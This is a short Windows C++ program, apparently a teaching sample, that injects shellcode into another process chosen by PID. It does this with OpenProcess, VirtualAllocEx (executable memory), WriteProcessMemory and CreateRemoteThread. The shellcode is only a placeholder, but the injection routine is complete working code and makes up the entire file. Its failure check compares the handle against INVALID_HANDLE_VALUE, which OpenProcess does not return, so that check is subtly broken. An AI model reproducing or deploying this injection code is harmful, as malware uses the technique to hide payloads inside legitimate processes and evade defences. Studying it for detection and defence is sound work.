#include <Windows.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "...";

    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    // get handle to process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // desired access level
        FALSE,
        pid                 // target process ID
    );

    // sanity check the handle is valid
    if (hProcess == INVALID_HANDLE_VALUE) {
        return 0;
    }

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,   // handle to target process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateRemoteThread(
        hProcess,   // handle to target process
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,
        NULL,
        0,
        &threadId
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,
        INFINITE
    );
    
    // close the thread handle
    CloseHandle(hThread);
}
